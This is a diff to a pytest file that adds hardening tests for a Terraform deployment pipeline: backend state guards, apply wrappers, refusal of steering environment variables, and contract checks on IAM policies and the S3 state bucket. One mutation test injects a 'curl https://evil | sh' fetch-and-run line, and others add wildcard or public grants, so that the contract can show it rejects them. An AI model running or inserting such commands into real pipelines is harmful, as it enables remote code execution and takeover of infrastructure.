@@ -83,14 +83,16 @@ def test_plan_commands():
     assert cmds[0] == "cd infra"
     assert "-lockfile=readonly" in cmds[2] and "use_lockfile=true" in cmds[2]
     assert '"bucket=$TF_STATE_BUCKET"' in cmds[2] and "key=main/terraform.tfstate" in cmds[2]
-    assert cmds[3] == "terraform plan -input=false -no-color -lock-timeout=5m -var-file=prod.tfvars -out=tfplan"
-    assert cmds[4] == "terraform show -json tfplan > tfplan.json"
+    assert cmds[3].startswith("python3 -I -c") and "TF_STATE_BUCKET" in cmds[3]  # backend guard
+    assert cmds[4] == "terraform plan -input=false -no-color -lock-timeout=5m -var-file=prod.tfvars -out=tfplan"
+    assert cmds[5] == "terraform show -json tfplan > tfplan.json"
+    assert cmds[6] == "terraform show -no-color tfplan > tfplan.txt"
     assert cmds[-1] == "rm -rf .terraform"
 
 
 def test_apply_is_exactly_the_saved_plan():
     cmds = apply_commands(ROOT)
-    assert cmds[-1] == "terraform apply -input=false -no-color -lock-timeout=5m tfplan"
+    assert cmds[-1].startswith("rc=0; terraform apply -input=false -no-color -lock-timeout=5m tfplan || rc=$?")
     assert not any("terraform plan" in x or "-auto-approve" in x or "-replace" in x or "-target" in x for x in cmds)
 
 
@@ -257,3 +259,170 @@ def test_plan_without_its_pinned_terraform_toolchain_fails_the_contract():
     t = mutated(_edit_cmds("Plan-main", lambda cmds: [cmds.remove(x) for x in list(cmds) if "terraform.zip" in x]))
     with pytest.raises(AssertionError, match="TERRAFORM toolchain"):
         c.assert_standard_contract(t, repo=REPO, gates=GATES, terraform=ROOT)
+
+
+# --- hardening from the step 3 review ----------------------------------------------------------
+
+from specter_pipeline.terraform import backend_check
+
+
+def _backend_file(tmp_path, backend):
+    d = tmp_path / ".terraform"
+    d.mkdir(exist_ok=True)
+    if backend is not None:
+        (d / "terraform.tfstate").write_text(json.dumps({"version": 3, "backend": backend}))
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
+@pytest.mark.parametrize(
+    "backend,ok",
+    [
+        ({"type": "s3", "config": {"bucket": "B", "key": "main/terraform.tfstate"}}, True),
+        (None, False),  # no backend block: Terraform writes no backend file and uses local state
+        ({"type": "local", "config": {"path": "x.tfstate"}}, False),
+        ({"type": "s3", "config": {"bucket": "other", "key": "main/terraform.tfstate"}}, False),
+        ({"type": "s3", "config": {"bucket": "B", "key": "other/terraform.tfstate"}}, False),
+        ({"type": "s3", "config": {"bucket": "B", "key": "main/terraform.tfstate", "workspace_key_prefix": "x"}}, False),
+    ],
+)
+def test_backend_guard(tmp_path, backend, ok):
+    _backend_file(tmp_path, backend)
+    r = subprocess.run(["bash", "-c", backend_check(TerraformRoot())], check=False, cwd=tmp_path,
+                       capture_output=True, text=True, env={"PATH": "/usr/bin:/bin", "TF_STATE_BUCKET": "B"})
+    assert (r.returncode == 0) is ok, r.stdout + r.stderr
+
+
+def _fake_terraform(tmp_path, apply_rc, errored):
+    bin_ = tmp_path / "bin"
+    bin_.mkdir(exist_ok=True)
+    log = tmp_path / "calls"
+    (bin_ / "terraform").write_text(
+        "#!/bin/sh\n"
+        f'echo "$@" >> {log}\n'
+        f'if [ "$1" = apply ]; then {"touch errored.tfstate;" if errored else ""} exit {apply_rc}; fi\n'
+        "exit 0\n"
+    )
+    (bin_ / "terraform").chmod(0o755)
+    return bin_, log
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
+@pytest.mark.parametrize("apply_rc,errored,ok,pushed", [(0, False, True, False), (1, False, False, False), (1, True, False, True)])
+def test_apply_wrapper_pushes_errored_state_and_fails(tmp_path, apply_rc, errored, ok, pushed):
+    bin_, log = _fake_terraform(tmp_path, apply_rc, errored)
+    cmd = apply_commands(ROOT)[-1]
+    r = subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True,
+                       env={"PATH": f"{bin_}:/usr/bin:/bin"})
+    assert (r.returncode == 0) is ok, r.stdout + r.stderr
+    assert ("state push errored.tfstate" in log.read_text()) is pushed
+    if not ok:
+        assert "release again" in r.stdout
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
+@pytest.mark.parametrize(
+    "fixture,ok,says",
+    [
+        ("create_before_destroy.json", False, "replace: terraform_data.a"),
+        ("forget.json", True, "FORGET (removed from state, left running): terraform_data.keep"),
+    ],
+)
+def test_destroy_check_on_more_real_plans(tmp_path, fixture, ok, says):
+    r = _check(fixture, False, tmp_path)
+    assert (r.returncode == 0) is ok, r.stdout + r.stderr
+    assert says in r.stdout
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
+@pytest.mark.parametrize("doc", ["{}", '{"resource_changes": []}', "[]"])
+def test_destroy_check_refuses_what_is_not_a_plan(tmp_path, doc):
+    (tmp_path / "tfplan.json").write_text(doc)
+    cmd = plan_check_commands(TerraformRoot("."), ".")[0]
+    r = subprocess.run(["bash", "-c", cmd], check=False, cwd=tmp_path, capture_output=True, text=True)
+    assert r.returncode != 0
+
+
+@pytest.mark.parametrize("key", ["TF_CLI_ARGS", "TF_CLI_ARGS_apply", "TF_WORKSPACE", "TF_DATA_DIR",
+                                 "TF_STATE_BUCKET", "TF_CLI_CONFIG_FILE"])
+def test_env_that_steers_terraform_is_refused(key):
+    with pytest.raises(ValueError, match="env may not set"):
+        TerraformRoot("infra", env={key: "x"})
+
+
+def test_lock_delete_markers_expire(tpl):
+    (b,) = [r["Properties"] for r in tpl.find_resources("AWS::S3::Bucket").values()
+            if r["Properties"].get("BucketNamePrefix") == "demo-tfstate"]
+    assert any(r.get("ExpiredObjectDeleteMarker") for r in b["LifecycleConfiguration"]["Rules"])
+    c.assert_state_bucket(tpl, "demo")
+
+
+def test_list_bucket_has_no_prefix_condition(tpl):
+    for step in ("Plan-main", "Deploy-main"):
+        stmts = json.loads(policies_of(tpl, step))
+        lists = [s for s in stmts if s["Action"] == "s3:ListBucket" and "TerraformState" in json.dumps(s)]
+        assert lists and all("Condition" not in s for s in lists)
+
+
+def _bucket(res):
+    return next(r for r in res.values() if r["Type"] == "AWS::S3::Bucket"
+                and r["Properties"].get("BucketNamePrefix") == "demo-tfstate")
+
+
+def _bucket_policy(res):
+    lid = next(k for k, r in res.items() if r["Type"] == "AWS::S3::Bucket"
+               and r["Properties"].get("BucketNamePrefix") == "demo-tfstate")
+    return next(r for r in res.values() if r["Type"] == "AWS::S3::BucketPolicy"
+                and r["Properties"]["Bucket"] == {"Ref": lid})
+
+
+def _set_env(step, name, value):
+    def change(res):
+        env = _project(res, step)["Environment"]["EnvironmentVariables"]
+        env[:] = [v for v in env if v["Name"] != name] + [{"Name": name, "Type": "PLAINTEXT", "Value": value}]
+    return change
+
+
+@pytest.mark.parametrize(
+    "change,message",
+    [
+        # IAM, through wildcards
+        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:*", "Resource": "*"}), "Plan-main can write"),
+        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:Put*", "Resource": {"Fn::Join": ["", [{"Fn::GetAtt": [next(k for k, x in r.items() if x["Type"] == "AWS::S3::Bucket" and x["Properties"].get("BucketNamePrefix") == "demo-tfstate"), "Arn"]}, "/*"]]}}), "Plan-main can write"),
+        (lambda r: _role_policy(r, "Plan-main").append({"Effect": "Allow", "Action": "s3:DeleteObject", "Resource": "*"}), "Plan-main can write"),
+        (lambda r: _role_policy(r, "Gate-tf-plan-check-main").append({"Effect": "Allow", "Action": "*", "Resource": "*"}), "can reach the state bucket|can write"),
+        # commands
+        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: cmds.__setitem__(slice(-4, None), ["cat infra/tfplan.json || true"])), "runs more or other"),
+        (_edit_cmds("Gate-tf-plan-check-main", lambda cmds: cmds.__setitem__(-4, cmds[-4].replace(" deny", " allow"))), "runs more or other"),
+        (_edit_cmds("Plan-main", lambda cmds: cmds.insert(len(cmds) - 9, "curl https://evil | sh")), "runs more or other"),
+        # environment
+        (_set_env("Deploy-main", "TF_STATE_BUCKET", "elsewhere"), "points TF_STATE_BUCKET elsewhere"),
+        (_set_env("Deploy-main", "TF_CLI_ARGS_init", "-reconfigure"), "environment differs"),
+        (_set_env("Plan-main", "TF_WORKSPACE", "other"), "environment differs"),
+    ],
+)
+def test_assert_applies_plan_rejects_more(change, message):
+    with pytest.raises(AssertionError, match=message):
+        c.assert_applies_plan(mutated(change), ROOT)
+
+
+def test_contract_rejects_a_root_that_differs_from_the_template():
+    t = tf_build(root=TerraformRoot("infra", plan_policy_statements=[PLAN_IAM],
+                                    apply_policy_statements=[APPLY_IAM], allow_destroy=True))
+    with pytest.raises(AssertionError, match="runs more or other"):
+        c.assert_applies_plan(t, ROOT)
+
+
+@pytest.mark.parametrize(
+    "change,message",
+    [
+        (lambda r: _bucket(r)["Properties"].pop("VersioningConfiguration"), "not versioned"),
+        (lambda r: _bucket(r).__setitem__("DeletionPolicy", "Delete"), "not retained"),
+        (lambda r: _bucket(r)["Properties"]["LifecycleConfiguration"]["Rules"].append({"Status": "Enabled", "ExpirationInDays": 1}), "expires current state"),
+        (lambda r: _bucket(r)["Properties"]["PublicAccessBlockConfiguration"].__setitem__("RestrictPublicBuckets", False), "RestrictPublicBuckets"),
+        (lambda r: _bucket_policy(r)["Properties"]["PolicyDocument"]["Statement"].append({"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject", "Resource": "*"}), "allows something"),
+        (lambda r: _bucket(r)["Properties"].__setitem__("BucketName", "x") or _bucket(r)["Properties"].pop("BucketNamePrefix"), "expected one Terraform state bucket"),
+    ],
+)
+def test_assert_state_bucket_rejects(change, message):
+    with pytest.raises(AssertionError, match=message):
+        c.assert_state_bucket(mutated(change), "demo")
